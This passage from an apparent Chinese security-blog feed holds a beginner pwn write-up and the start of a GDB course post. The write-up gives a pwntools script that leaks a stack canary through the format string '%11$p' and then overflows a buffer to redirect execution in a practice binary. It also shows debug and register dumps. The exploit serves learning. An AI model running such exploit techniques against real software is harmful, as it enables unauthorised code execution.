&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[DEBUG] Received &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt; bytes:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;input your name\n&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[DEBUG] Sent &lt;span class=&#34;number&#34;&gt;0x6&lt;/span&gt; bytes:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;$p\n&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;\n&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[DEBUG] Received &lt;span class=&#34;number&#34;&gt;0x2e&lt;/span&gt; bytes:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;hello: \n&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&lt;span class=&#34;number&#34;&gt;&amp;#x27;0&lt;/span&gt;x2535be38a9253e00\n&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    b&lt;span class=&#34;number&#34;&gt;&amp;#x27;l&lt;/span&gt;eave some message\n&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;hello: \n&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;ezpwn&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p.sendline(b&amp;quot;a&amp;quot;*32)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;quot;%11$p&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p.recvline())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(p.recvline())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(p.recvline()[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;],&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;canary:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(canary))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;canary:&amp;quot;&lt;/span&gt;,canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;message&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt; +p64(canary) + p64(&lt;span class=&#34;number&#34;&gt;0x123456&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0x4012b0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x4011d6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;











&lt;h2 id=&#34;关于格式化字符串传参：&#34;&gt;&lt;a href=&#34;#关于格式化字符串传参：&#34; class=&#34;headerlink&#34; title=&#34;关于格式化字符串传参：&#34;&gt;&lt;/a&gt;关于格式化字符串传参：&lt;/h2&gt;&lt;p&gt;传递10个参数看看&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1:%s 2:%s 3:%s 4:%s 5:%s 6:%s 7:%s 8:%s 9:%s\n&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1aaa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2bbb&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;3ccc&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;4ddd&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;5eee&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;6fff&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;7ggg&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;8hhh&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;9iii&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​	rdi、rsi、rdx、rcx、r8、r9&lt;/p&gt;
&lt;p&gt;​	可以看到前5个在寄存器,后面在栈里,从rsp开始&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;*RAX  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RBX  &lt;span class=&#34;number&#34;&gt;0x5555555551b0&lt;/span&gt; (__libc_csu_init) ◂— endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RCX  &lt;span class=&#34;number&#34;&gt;0x555555556012&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x6262320063636333&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;3ccc&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RDX  &lt;span class=&#34;number&#34;&gt;0x555555556017&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x6161310062626232&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;2bbb&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RDI  &lt;span class=&#34;number&#34;&gt;0x555555556028&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;1:%s 2:%s 3:%s 4:%s 5:%s 6:%s 7:%s 8:%s 9:%s\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RSI  &lt;span class=&#34;number&#34;&gt;0x55555555601c&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x61616131&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;1aaa&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R8   &lt;span class=&#34;number&#34;&gt;0x55555555600d&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x6363330064646434&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;4ddd&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R9   &lt;span class=&#34;number&#34;&gt;0x555555556008&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x6464340065656535&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;5eee&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R10  &lt;span class=&#34;number&#34;&gt;0x3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R11  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R12  &lt;span class=&#34;number&#34;&gt;0x555555555060&lt;/span&gt; (_start) ◂— endbr64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R13  &lt;span class=&#34;number&#34;&gt;0x7fffffffe5a0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R14  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R15  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RBP  &lt;span class=&#34;number&#34;&gt;0x7fffffffe4b0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RSP  &lt;span class=&#34;number&#34;&gt;0x7fffffffe490&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x555555556065&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x100000066666636&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;6fff&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RIP  &lt;span class=&#34;number&#34;&gt;0x5555555551a0&lt;/span&gt; (main+&lt;span class=&#34;number&#34;&gt;87&lt;/span&gt;) ◂— call &lt;span class=&#34;number&#34;&gt;0x555555555050&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│ rsp &lt;span class=&#34;number&#34;&gt;0x7fffffffe490&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x555555556065&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x100000066666636&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;6fff&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7fffffffe498&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x555555556060&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x6666360067676737&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;7ggg&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;02&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7fffffffe4a0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55555555605b&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x6767370068686838&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;8hhh&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7fffffffe4a8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x555555556056&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x6868380069696939&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;9iii&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0020&lt;/span&gt;│ rbp &lt;span class=&#34;number&#34;&gt;0x7fffffffe4b0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0028&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7fffffffe4b8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffff7de4083&lt;/span&gt; (__libc_start_main+&lt;span class=&#34;number&#34;&gt;243&lt;/span&gt;) ◂— mov edi, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0030&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7fffffffe4c0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffff7ffc620&lt;/span&gt; (_rtld_global_ro) ◂— &lt;span class=&#34;number&#34;&gt;0x50f7a00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;07&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0038&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0x7fffffffe4c8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fffffffe5a8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7fffffffe7f4&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/ubuntu/c/a.out&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;







&lt;h2 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;类似的题&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/tbsqigongzi/article/details/124371294&#34;&gt;https://blog.csdn.net/tbsqigongzi/article/details/124371294&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这个为什么进入ret了,但是失败了? ret栈平衡?&lt;/p&gt;
&lt;p&gt;  fflush(_bss_start);有什么用呢&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-10-30T13:15:56.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/</id>
        <title>盛格塾课程-拍案惊奇GDB以战说法1-谁截断了我的指针?</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/"/>
        <content type="html">&lt;h1 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;​	之前知道老师是因为《软件调试》这本书，非常厉害，但是因为主要是windows的一直还没读（因为主要学习Linux，不过最近越发感觉不能局限于一个系统），最近看见一个大佬在朋友圈转发这个课，才发现张老师原来是有自己的公司和培训，看了下来太牛了，立马报名了。&lt;/p&gt;
&lt;p&gt;​	(老师b站也有号, 官网nanocode.cn,) 还有其他很多优秀的课程,看来要好好买一波了..这才是真正有价值的知识付费!!&lt;/p&gt;
&lt;h1 id=&#34;背景&#34;&gt;&lt;a href=&#34;#背景&#34; class=&#34;headerlink&#34; title=&#34;背景&#34;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;​	老师将实际案例中的一个问题抽象出了一个很简单的demo, 用于搜索argv[0]的名字, 其实也就是当前可执行程序的名字,本身看着这个代码是没有什么问题的(不,有问题,没有include parser.c)&lt;/p&gt;
&lt;p&gt;parser.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// parser.c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span 